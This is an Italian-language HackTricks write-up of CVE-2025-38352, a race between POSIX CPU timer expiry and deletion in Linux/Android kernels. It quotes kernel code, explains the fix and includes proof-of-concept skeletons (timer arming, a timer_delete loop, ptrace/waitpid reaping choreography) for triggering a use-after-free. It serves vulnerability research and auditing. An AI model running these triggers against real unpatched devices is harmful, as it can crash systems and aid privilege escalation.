# POSIX CPU Timers TOCTOU race (CVE-2025-38352)

{{#include ../../../banners/hacktricks-training.md}}

Questa pagina documenta una TOCTOU race condition in Linux/Android POSIX CPU timers che può corrompere lo stato del timer e causare il crash del kernel, e in alcune circostanze può essere indirizzata verso privilege escalation.

- Componente interessato: kernel/time/posix-cpu-timers.c
- Primitiva: expiry vs deletion race durante l'uscita del task
- Dipendente dalla configurazione: CONFIG_POSIX_CPU_TIMERS_TASK_WORK=n (IRQ-context expiry path)

Breve riepilogo degli internals (rilevante per exploitation)
- Tre clock CPU gestiscono la contabilizzazione dei timer tramite cpu_clock_sample():
- CPUCLOCK_PROF: utime + stime
- CPUCLOCK_VIRT: solo utime
- CPUCLOCK_SCHED: task_sched_runtime()
- La creazione del timer collega un timer a un task/pid e inizializza i nodi timerqueue:
```c
static int posix_cpu_timer_create(struct k_itimer *new_timer) {
struct pid *pid;
rcu_read_lock();
pid = pid_for_clock(new_timer->it_clock, false);
if (!pid) { rcu_read_unlock(); return -EINVAL; }
new_timer->kclock = &clock_posix_cpu;
timerqueue_init(&new_timer->it.cpu.node);
new_timer->it.cpu.pid = get_pid(pid);
rcu_read_unlock();
return 0;
}
```
- L'arming inserisce in una per-base timerqueue e può aggiornare la next-expiry cache:
```c
static void arm_timer(struct k_itimer *timer, struct task_struct *p) {
struct posix_cputimer_base *base = timer_base(timer, p);
struct cpu_timer *ctmr = &timer->it.cpu;
u64 newexp = cpu_timer_getexpires(ctmr);
if (!cpu_timer_enqueue(&base->tqhead, ctmr)) return;
if (newexp < base->nextevt) base->nextevt = newexp;
}
```
- Il percorso rapido evita elaborazioni costose a meno che le scadenze memorizzate nella cache non indichino una possibile attivazione:
```c
static inline bool fastpath_timer_check(struct task_struct *tsk) {
struct posix_cputimers *pct = &tsk->posix_cputimers;
if (!expiry_cache_is_inactive(pct)) {
u64 samples[CPUCLOCK_MAX];
task_sample_cputime(tsk, samples);
if (task_cputimers_expired(samples, pct))
return true;
}
return false;
}
```
Expiration raccoglie i timer scaduti, li marca come firing, li rimuove dalla coda; la consegna effettiva è differita:
```c
#define MAX_COLLECTED 20
static u64 collect_timerqueue(struct timerqueue_head *head,
struct list_head *firing, u64 now) {
struct timerqueue_node *next; int i = 0;
while ((next = timerqueue_getnext(head))) {
struct cpu_timer *ctmr = container_of(next, struct cpu_timer, node);
u64 expires = cpu_timer_getexpires(ctmr);
if (++i == MAX_COLLECTED || now < expires) return expires;
ctmr->firing = 1;                           // critical state
rcu_assign_pointer(ctmr->handling, current);
cpu_timer_dequeue(ctmr);
list_add_tail(&ctmr->elist, firing);
}
return U64_MAX;
}
```
Due modalità di elaborazione delle scadenze
- CONFIG_POSIX_CPU_TIMERS_TASK_WORK=y: la scadenza viene differita tramite task_work sul task target
- CONFIG_POSIX_CPU_TIMERS_TASK_WORK=n: la scadenza è gestita direttamente nel contesto IRQ

<details>
<summary>Task_work vs percorsi di scadenza IRQ</summary>
```c
void run_posix_cpu_timers(void) {
struct task_struct *tsk = current;
__run_posix_cpu_timers(tsk);
}
#ifdef CONFIG_POSIX_CPU_TIMERS_TASK_WORK
static inline void __run_posix_cpu_timers(struct task_struct *tsk) {
if (WARN_ON_ONCE(tsk->posix_cputimers_work.scheduled)) return;
tsk->posix_cputimers_work.scheduled = true;
task_work_add(tsk, &tsk->posix_cputimers_work.work, TWA_RESUME);
}
#else
static inline void __run_posix_cpu_timers(struct task_struct *tsk) {
lockdep_posixtimer_enter();
handle_posix_cpu_timers(tsk);                  // IRQ-context path
lockdep_posixtimer_exit();
}
#endif
```
</details>

Nel percorso IRQ-context, la firing list viene elaborata al di fuori di sighand

<details>
<summary>IRQ-context ciclo di consegna</summary>
```c
static void handle_posix_cpu_timers(struct task_struct *tsk) {
struct k_itimer *timer, *next; unsigned long flags, start;
LIST_HEAD(firing);
if (!lock_task_sighand(tsk, &flags)) return;   // may fail on exit
do {
start = READ_ONCE(jiffies); barrier();
check_thread_timers(tsk, &firing);
check_process_timers(tsk, &firing);
} while (!posix_cpu_timers_enable_work(tsk, start));
unlock_task_sighand(tsk, &flags);              // race window opens here
list_for_each_entry_safe(timer, next, &firing, it.cpu.elist) {
int cpu_firing;
spin_lock(&timer->it_lock);
list_del_init(&timer->it.cpu.elist);
cpu_firing = timer->it.cpu.firing;         // read then reset
timer->it.cpu.firing = 0;
if (likely(cpu_firing >= 0)) cpu_timer_fire(timer);
rcu_assign_pointer(timer->it.cpu.handling, NULL);
spin_unlock(&timer->it_lock);
}
}
```
</details>

Causa principale: TOCTOU tra la scadenza in contesto IRQ e la cancellazione concorrente durante la terminazione del task
Precondizioni
- CONFIG_POSIX_CPU_TIMERS_TASK_WORK è disabilitato (in uso il percorso IRQ)
- Il task target sta terminando ma non è ancora stato completamente rimosso
- Un altro thread invoca contemporaneamente posix_cpu_timer_del() per lo stesso timer

Sequenza
1) update_process_times() innesca run_posix_cpu_timers() in contesto IRQ per il task in uscita.
2) collect_timerqueue() imposta ctmr->firing = 1 e sposta il timer nella lista temporanea dei firing.
3) handle_posix_cpu_timers() rilascia sighand tramite unlock_task_sighand() per consegnare i timer al di fuori del lock.
4) Immediatamente dopo l'unlock, il task in uscita può essere rimosso; un thread sibling esegue posix_cpu_timer_del().
5) In questa finestra, posix_cpu_timer_del() può non riuscire ad acquisire lo stato tramite cpu_timer_task_rcu()/lock_task_sighand() e quindi saltare il normale meccanismo di protezione per i timer in corso che controlla timer->it.cpu.firing. La cancellazione procede come se non stesse firing, corrompendo lo stato mentre la scadenza viene gestita, portando a crash/UB.

### Come release_task() e timer_delete() liberano i timer in firing
Anche dopo che handle_posix_cpu_timers() ha rimosso il timer dalla lista del task, uno zombie ptraced può comunque essere rimosso. Lo stack di waitpid() guida release_task() → __exit_signal(), che smonta sighand e le code dei segnali mentre un'altra CPU sta ancora mantenendo puntatori all'oggetto timer:
```c
static void __exit_signal(struct task_struct *tsk)
{
struct sighand_struct *sighand = lock_task_sighand(tsk, NULL);
// ... signal cleanup elided ...
tsk->sighand = NULL;             // makes future lock_task_sighand() fail
unlock_task_sighand(tsk, NULL);
}
```
Con sighand staccato, timer_delete() restituisce comunque successo perché posix_cpu_timer_del() lascia `ret = 0` quando il locking fallisce, quindi la syscall procede a liberare l'oggetto tramite RCU:
```c
static int posix_cpu_timer_del(struct k_itimer *timer)
{
struct sighand_struct *sighand = lock_task_sighand(p, &flags);
if (unlikely(!sighand))
goto out;                   // ret stays 0 -> userland sees success
// ... normal unlink path ...
}
```

```c
SYSCALL_DEFINE1(timer_delete, timer_t, timer_id)
{
if (timer_delete_hook(timer) == TIMER_RETRY)
timer = timer_wait_running(timer, &flags);
posix_timer_unhash_and_free(timer);            // call_rcu(k_itimer_rcu_free)
return 0;
}
```
Poiché l'oggetto slab viene RCU-freed mentre il contesto IRQ continua a scorrere la lista `firing`, il riuso della timer cache diventa una primitiva UAF.

### Controllare il reap con ptrace + waitpid
Il modo più semplice per mantenere uno zombie senza che venga auto-reaped è fare ptrace su un thread worker non-leader. exit_notify() imposta prima `exit_state = EXIT_ZOMBIE` e passa a EXIT_DEAD solo se `autoreap` è true. Per i thread ptraced, `autoreap = do_notify_parent()` rimane false finché SIGCHLD non viene ignorato, quindi release_task() viene eseguita solo quando il processo padre chiama esplicitamente waitpid():

- Usare pthread_create() nel tracee in modo che la vittima non sia il thread-group leader (wait_task_zombie() gestisce i non-leader ptraced).
- Il processo padre esegue `ptrace(PTRACE_ATTACH, tid)` e poi `waitpid(tid, __WALL)` per far sì che vengano invocate do_wait_pid() → wait_task_zombie() → release_task().
- Pipe o memoria condivisa trasmettono l'esatto TID al processo padre in modo che il worker corretto venga reaped su richiesta.

Questa coreografia garantisce una finestra in cui handle_posix_cpu_timers() può ancora riferirsi a `tsk->sighand`, mentre una successiva waitpid() ne provoca la rimozione e permette a timer_delete() di reclamare lo stesso oggetto k_itimer.

Perché la modalità TASK_WORK è sicura per progettazione
- Con CONFIG_POSIX_CPU_TIMERS_TASK_WORK=y, la scadenza viene differita a task_work; exit_task_work viene eseguito prima di exit_notify, quindi non si verifica la sovrapposizione temporale tra IRQ e reaping.
- Anche in tal caso, se il task sta già uscendo, task_work_add() fallisce; il controllo su exit_state rende entrambe le modalità consistenti.

Correzione (Android common kernel) e motivazione
- Aggiungere un ritorno anticipato se il task corrente sta uscendo, bloccando tutta l'elaborazione:
```c
// kernel/time/posix-cpu-timers.c (Android common kernel commit 157f357d50b5038e5eaad0b2b438f923ac40afeb)
if (tsk->exit_state)
return;
```
- Questo impedisce l'entrata in handle_posix_cpu_timers() per i task in uscita, eliminando la finestra in cui posix_cpu_timer_del() potrebbe non rilevare it.cpu.firing e concorrere con l'elaborazione della scadenza.

Impatto
- La corruzione della memoria del kernel delle strutture timer durante scadenza/cancellazione concorrente può causare crash immediati (DoS) ed è un potente primitivo per privilege escalation grazie alle opportunità di manipolazione arbitraria dello stato del kernel.

Triggering the bug (condizioni sicure e riproducibili)
Build/config
- Assicurarsi che CONFIG_POSIX_CPU_TIMERS_TASK_WORK=n e usare un kernel senza la correzione di gating exit_state. Su x86/arm64 l'opzione è normalmente forzata on via HAVE_POSIX_CPU_TIMERS_TASK_WORK, quindi i ricercatori spesso patchano `kernel/time/Kconfig` per esporre un interruttore manuale:
```c
config POSIX_CPU_TIMERS_TASK_WORK
bool "CVE-2025-38352: POSIX CPU timers task_work toggle" if EXPERT
depends on POSIX_TIMERS && HAVE_POSIX_CPU_TIMERS_TASK_WORK
default y
```
Questo rispecchia ciò che i vendor Android hanno fatto per le build per l'analisi; upstream x86_64 e arm64 forzano HAVE_POSIX_CPU_TIMERS_TASK_WORK=y, quindi il vulnerable IRQ path esiste principalmente sui kernel Android a 32-bit dove l'opzione è esclusa in fase di compilazione.

- Esegui su una VM multi-core (e.g., QEMU `-smp cores=4`) così parent, child main, and worker threads possono rimanere pinned su CPU dedicate.

Runtime strategy
- Target a thread that is about to exit and attach a CPU timer to it (per-thread or process-wide clock):
- For per-thread: timer_create(CLOCK_THREAD_CPUTIME_ID, ...)
- For process-wide: timer_create(CLOCK_PROCESS_CPUTIME_ID, ...)
- Arm with a very short initial expiration and small interval to maximize IRQ-path entries:
```c
static timer_t t;
static void setup_cpu_timer(void) {
struct sigevent sev = {0};
sev.sigev_notify = SIGEV_SIGNAL;    // delivery type not critical for the race
sev.sigev_signo = SIGUSR1;
if (timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &t)) perror("timer_create");
struct itimerspec its = {0};
its.it_value.tv_nsec = 1;           // fire ASAP
its.it_interval.tv_nsec = 1;        // re-fire
if (timer_settime(t, 0, &its, NULL)) perror("timer_settime");
}
```
- Da un sibling thread, eliminare contemporaneamente lo stesso timer mentre il target thread esce:
```c
void *deleter(void *arg) {
for (;;) (void)timer_delete(t);     // hammer delete in a loop
}
```
- Amplificatori della race: alta frequenza di tick dello scheduler, carico CPU, cicli ripetuti di exit/ricreazione dei thread. Il crash si manifesta tipicamente quando posix_cpu_timer_del() non rileva il firing a causa del fallimento della lookup/locking del task subito dopo unlock_task_sighand().

### Orchestrazione pratica del PoC
#### Coreografia dei thread e IPC
Un riproduttore affidabile esegue fork in un parent ptracing e un child che genera il worker thread vulnerabile. Due pipe (`c2p`, `p2c`) consegnano il TID del worker e regolano ogni fase, mentre un `pthread_barrier_t` impedisce al worker di armare il suo timer finché il parent non si è collegato. Ogni processo o thread è fissato con `sched_setaffinity()` (es., parent su CPU1, child main su CPU0, worker su CPU2) per minimizzare il rumore dello scheduler e mantenere la race riproducibile.

#### Calibrazione del timer con CLOCK_THREAD_CPUTIME_ID
Il worker arma un timer CPU per-thread in modo che solo il suo consumo CPU avanzi la scadenza. Un `wait_time` regolabile (predefinito ≈250 µs di tempo CPU) più un busy loop limitato assicurano che `exit_notify()` imposti `EXIT_ZOMBIE` mentre il timer è sul punto di scattare:

<details>
<summary>Scheletro minimo del timer CPU per-thread</summary>
```c
static timer_t timer;
static long wait_time = 250000; // nanoseconds of CPU time

static void timer_fire(sigval_t unused) {
puts("timer fired");
}

static void *worker(void *arg) {
struct sigevent sev = {0};
sev.sigev_notify = SIGEV_THREAD;
sev.sigev_notify_function = timer_fire;
timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &timer);

struct itimerspec ts = {
.it_interval = {0, 0},
.it_value    = {0, wait_time},
};

pthread_barrier_wait(&barrier);  // released by child main after ptrace attach
timer_settime(timer, 0, &ts, NULL);

for (volatile int i = 0; i < 1000000; i++); // burn CPU before exiting
return NULL;                                 // do_exit() keeps burning CPU
}
```
</details>

#### Cronologia della race
1. Il child comunica al parent il TID del worker tramite `c2p`, poi si blocca sulla barriera.
2. Il parent esegue `PTRACE_ATTACH`, aspetta in `waitpid(__WALL)`, poi `PTRACE_CONT` per lasciare che il worker esegua ed esca.
3. Quando euristiche (o input manuale dell'operatore) suggeriscono che il timer è stato raccolto nella lista `firing` lato IRQ, il parent esegue di nuovo `waitpid(tid, __WALL)` per triggerare release_task() e rilasciare `tsk->sighand`.
4. Il parent segnala il child tramite `p2c` così il main del child può chiamare `timer_delete(timer)` e immediatamente eseguire un helper come `wait_for_rcu()` fino al completamento della callback RCU del timer.
5. Il contesto IRQ alla fine riprende `handle_posix_cpu_timers()` e dereferenzia il `struct k_itimer` già liberato, facendo scattare KASAN o WARN_ON().

#### Strumentazione kernel opzionale
Per setup di ricerca, iniettare un `mdelay(500)` di sola debug dentro handle_posix_cpu_timers() quando `tsk->comm == "SLOWME"` amplia la finestra in modo che la coreografia sopra quasi sempre vinca la race. Lo stesso PoC rinomina anche i thread (`prctl(PR_SET_NAME, ...)`) così i log del kernel e i breakpoint confermano che il worker previsto viene raccolto.

### Indizi di strumentazione durante lo sfruttamento
- Aggiungere tracepoints/WARN_ONCE intorno a unlock_task_sighand()/posix_cpu_timer_del() per individuare i casi in cui `it.cpu.firing==1` coincide con cpu_timer_task_rcu()/lock_task_sighand() falliti; monitorare la coerenza della timerqueue quando la vittima esce.
- KASAN tipicamente riporta `slab-use-after-free` dentro posix_timer_queue_signal(), mentre kernel non-KASAN loggano WARN_ON_ONCE() da send_sigqueue() quando la race va a segno, fornendo un indicatore rapido di successo.

Punti critici per l'audit (per i revisori)
- update_process_times() → run_posix_cpu_timers() (IRQ)
- __run_posix_cpu_timers() selection (TASK_WORK vs IRQ path)
- collect_timerqueue(): sets ctmr->firing and moves nodes
- handle_posix_cpu_timers(): drops sighand before firing loop
- posix_cpu_timer_del(): relies on it.cpu.firing to detect in-flight expiry; this check is skipped when task lookup/lock fails during exit/reap

Note per la ricerca sullo sfruttamento
- Il comportamento divulgato è una primitiva affidabile per crashare il kernel; trasformarlo in escalation di privilegi tipicamente richiede un'ulteriore sovrapposizione controllabile (lifetime di oggetti o write-what-where) oltre lo scopo di questo sommario. Trattare qualsiasi PoC come potenzialmente destabilizzante ed eseguirlo solo in emulatori/VMs.

## References
- [Race Against Time in the Kernel’s Clockwork (StreyPaws)](https://streypaws.github.io/posts/Race-Against-Time-in-the-Kernel-Clockwork/)
- [Android security bulletin – September 2025](https://source.android.com/docs/security/bulletin/2025-09-01)
- [Android common kernel patch commit 157f357d50b5…](https://android.googlesource.com/kernel/common/+/157f357d50b5038e5eaad0b2b438f923ac40afeb%5E%21/#F0)
- [CVE-2025-38352 – In-the-wild Android Kernel Vulnerability Analysis and PoC](https://faith2dxy.xyz/2025-12-22/cve_2025_38352_analysis/)
- [poc-CVE-2025-38352 (GitHub)](https://github.com/farazsth98/poc-CVE-2025-38352)
- [Linux stable fix commit f90fff1e152d](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/?id=f90fff1e152dedf52b932240ebbd670d83330eca)

{{#include ../../../banners/hacktricks-training.md}}
